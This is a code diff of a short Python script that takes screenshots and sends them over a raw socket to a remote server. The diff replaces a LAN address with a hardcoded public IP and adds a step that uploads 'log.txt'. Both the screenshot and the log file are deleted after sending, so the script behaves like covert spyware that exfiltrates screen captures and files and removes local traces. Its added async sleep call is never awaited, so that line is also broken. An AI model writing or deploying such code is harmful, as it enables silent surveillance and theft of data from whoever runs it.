@@ -3,6 +3,8 @@ import random
 import socket
 import string
 
+from anyio import sleep
+
 
 def screenshot():
     global pics_names
@@ -12,14 +14,14 @@ def screenshot():
                        + string.digits) for _ in range(7))
     name = str(generate_name())
     pyautogui.screenshot().save(name + '.png')
-    send_file(name)
+    send_file(name+'.png')
     return name+'.png'
 
 
 def send_file(file_path):
-    HOST = '192.168.1.166'  # Server IP address
+    HOST = '113.203.205.89'  # Server IP address
     PORT = 12345  # Server port number
-    file_path = file_path+".png"
+    file_path = file_path
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((HOST, PORT))
         print('Connected to', HOST)
@@ -38,6 +40,10 @@ def send_file(file_path):
         print('File sent successfully')
 
 if __name__ == '__main__':
-    file_path = 'file.txt'  # Replace with the actual file path
+    file_path = 'log.txt'
     name = screenshot()
+    print(name)
     os.remove(name)
+    sleep(2)
+    send_file(file_path)
+    os.remove(file_path)
